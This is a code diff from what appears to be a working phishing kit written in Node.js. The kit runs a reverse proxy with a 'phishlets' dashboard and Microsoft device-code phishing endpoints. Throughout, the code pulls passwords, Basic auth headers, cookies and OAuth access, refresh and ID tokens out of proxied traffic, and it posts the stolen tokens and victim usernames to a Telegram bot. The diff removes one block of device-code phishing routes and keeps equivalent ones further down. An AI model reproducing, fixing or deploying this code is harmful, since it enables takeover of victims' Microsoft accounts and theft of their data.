@@ -97,7 +97,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
 }
 
 // ================================================
-// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FULLY FIXED WITH TOKENS)
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
 // ================================================
 
 async function sendToTelegram(data) {
@@ -163,7 +163,6 @@ async function sendToTelegram(data) {
                 }
             }
             
-            // ── PATTERN: CHECK FOR PASSWORD IN RESPONSE ──
             if (url.includes('/token') || url.includes('/GetCredentialType')) {
                 if (data.proxyResponseBody) {
                     const respStr = typeof data.proxyResponseBody === 'string' ? 
@@ -177,7 +176,6 @@ async function sendToTelegram(data) {
                 }
             }
 
-            // ── CHECK FOR PASSWORD IN HEADERS ──
             if (data.proxyRequestHeaders) {
                 const authHeader = data.proxyRequestHeaders['authorization'];
                 if (authHeader && authHeader.includes('Basic')) {
@@ -193,7 +191,6 @@ async function sendToTelegram(data) {
                 }
             }
 
-            // ── PATTERN: CAPTURE TOKENS FROM RESPONSE BODY ──
             if (data.proxyResponseBody) {
                 const respStr = typeof data.proxyResponseBody === 'string' ? 
                     data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
@@ -228,7 +225,6 @@ async function sendToTelegram(data) {
                 }
             }
 
-            // ── PATTERN: CHECK FOR TOKENS IN URL ──
             if (url.includes('access_token=') || url.includes('refresh_token=') || url.includes('id_token=')) {
                 const tokenMatch = url.match(/[?&](?:access_token|refresh_token|id_token)=([^&]+)/i);
                 if (tokenMatch) {
@@ -1235,188 +1231,8 @@ dashApp.post('/api/phishlets/toggle', (req, res) => {
     }
 });
 
-// ── DEVICE CODE PHISHING ENDPOINTS ──
-const deviceSessions = {};
-
-// ── GET DEVICE CODE FROM MICROSOFT (PROXY) ──
-dashApp.post('/api/device/request', async (req, res) => {
-    try {
-        const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
-            new URLSearchParams({
-                client_id: '4765445b-32c6-49b0-83e6-1d93765276ca',
-                scope: 'openid profile https://www.office.com/v2/OfficeHome.All offline_access'
-            }),
-            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-        );
-        
-        const data = response.data;
-        
-        const existing = deviceFlows.find(f => f.user_code === data.user_code);
-        if (!existing) {
-            deviceFlows.push({
-                user_code: data.user_code,
-                device_code: data.device_code,
-                session_id: data.device_code,
-                status: 'pending',
-                created: new Date().toISOString(),
-                token_type: 'Device Code',
-                verification_uri: data.verification_uri
-            });
-        }
-        
-        const message = `
-📱 **Device Code Phishing**
-
-🆔 **User Code:** \`${data.user_code}\`
-🔗 **Verification URI:** ${data.verification_uri}
-⏱️ **Expires in:** ${data.expires_in} seconds
-
-**Code:** \`${data.user_code}\`
-        `;
-        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        }).catch(() => {});
-        
-        res.json(data);
-    } catch (error) {
-        console.error('Device code error:', error.message);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-dashApp.post('/api/device-code', (req, res) => {
-    const { device_code, user_code, session_id } = req.body;
-    deviceSessions[session_id] = {
-        device_code,
-        user_code,
-        session_id,
-        timestamp: Date.now(),
-        status: 'pending'
-    };
-    
-    const existing = deviceFlows.find(f => f.user_code === user_code);
-    if (!existing) {
-        deviceFlows.push({
-            user_code: user_code,
-            device_code: device_code,
-            session_id: session_id,
-            status: 'pending',
-            created: new Date().toISOString(),
-            token_type: 'Device Code'
-        });
-    }
-    
-    res.json({ success: true });
-});
-
-dashApp.post('/api/device-token', async (req, res) => {
-    const { device_code, session_id } = req.body;
-    
-    try {
-        const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
-            new URLSearchParams({
-                client_id: '4765445b-32c6-49b0-83e6-1d93765276ca',
-                device_code: device_code,
-                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
-            }),
-            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-        );
-        
-        const tokens = response.data;
-        
-        if (!CAPTURED_TOKENS[session_id]) CAPTURED_TOKENS[session_id] = {};
-        if (tokens.access_token) CAPTURED_TOKENS[session_id].access_token = tokens.access_token;
-        if (tokens.refresh_token) CAPTURED_TOKENS[session_id].refresh_token = tokens.refresh_token;
-        if (tokens.id_token) CAPTURED_TOKENS[session_id].id_token = tokens.id_token;
-        
-        const flow = deviceFlows.find(f => f.session_id === session_id || f.device_code === device_code);
-        if (flow) {
-            flow.status = 'approved';
-            flow.approved = new Date().toISOString();
-            flow.access_token = tokens.access_token;
-            flow.refresh_token = tokens.refresh_token;
-            flow.token_type = 'OAuth2';
-            if (tokens.id_token) {
-                try {
-                    const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
-                    flow.username = payload.email || payload.preferred_username || 'Unknown';
-                } catch (e) {}
-            }
-            console.log(`✅ Device flow approved: ${flow.user_code}`);
-        }
-        
-        const message = `
-📱 **Device Code Phishing - SUCCESS!**
-
-🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
-🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
-🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30)}...\`
-
-👤 **User:** ${tokens.id_token ? JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString()).email : 'Unknown'}
-        `;
-        
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-        
-        res.json(tokens);
-    } catch (error) {
-        if (error.response?.data?.error === 'authorization_pending') {
-            res.json({ error: 'authorization_pending' });
-        } else if (error.response?.data?.error === 'expired_token') {
-            const flow = deviceFlows.find(f => f.session_id === session_id || f.device_code === device_code);
-            if (flow) {
-                flow.status = 'expired';
-            }
-            res.json({ error: 'expired_token' });
-        } else {
-            console.error('Device token error:', error.message);
-            res.status(500).json({ error: error.message });
-        }
-    }
-});
-
-dashApp.get('/api/device/history', (req, res) => {
-    res.json({ success: true, flows: deviceFlows });
-});
-
-dashApp.post('/api/device/manual', (req, res) => {
-    const { user_code } = req.body;
-    if (!user_code) return res.status(400).json({ error: 'Code required' });
-    
-    if (deviceFlows.some(f => f.user_code === user_code.toUpperCase())) {
-        return res.status(400).json({ error: 'Code already exists' });
-    }
-    
-    const flow = {
-        user_code: user_code.toUpperCase(),
-        status: 'pending',
-        created: new Date().toISOString(),
-        session_id: Math.random().toString(36).substring(2, 15),
-        token_type: 'Manual'
-    };
-    deviceFlows.push(flow);
-    res.json({ success: true, flow });
-});
-
-dashApp.post('/api/device/use', async (req, res) => {
-    const { session_id } = req.body;
-    const flow = deviceFlows.find(f => f.session_id === session_id);
-    if (!flow || !flow.access_token) {
-        return res.status(404).json({ error: 'No token found' });
-    }
-    res.json({ 
-        success: true, 
-        access_token: flow.access_token, 
-        refresh_token: flow.refresh_token 
-    });
-});
+// ── DEVICE CODE ENDPOINTS (MOVED TO MAIN APP BELOW) ──
+// These are now in the main app section at the bottom
 
 // ================================================
 // 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
@@ -2385,16 +2201,15 @@ const app = express();
 // ── ✅ DEVICE CODE API (NO AUTH) ──
 app.post('/device/request', async (req, res) => {
     try {
-        console.log('📱 Device code requested directly');
+        console.log('📱 Device code requested');
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: '4765445b-32c6-49b0-83e6-1d93765276ca',
-                scope: 'openid profile https://www.office.com/v2/OfficeHome.All offline_access'
+                scope: 'openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All%20offline_access'
             }),
             { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
         );
-        
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
         
@@ -2430,8 +2245,8 @@ app.post('/device/request', async (req, res) => {
         
         res.json(data);
     } catch (error) {
-        console.error('❌ Device code error:', error.message);
-        res.status(500).json({ error: error.message });
+        console.error('❌ Device code error:', error.response?.data || error.message);
+        res.status(500).json({ error: error.response?.data || error.message });
     }
 });
 
@@ -2440,7 +2255,7 @@ app.post('/device/token', async (req, res) => {
     const { device_code } = req.body;
     
     try {
-        console.log('🔄 Polling for token with device_code:', device_code?.slice(0, 10) + '...');
+        console.log('🔄 Polling for token...');
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
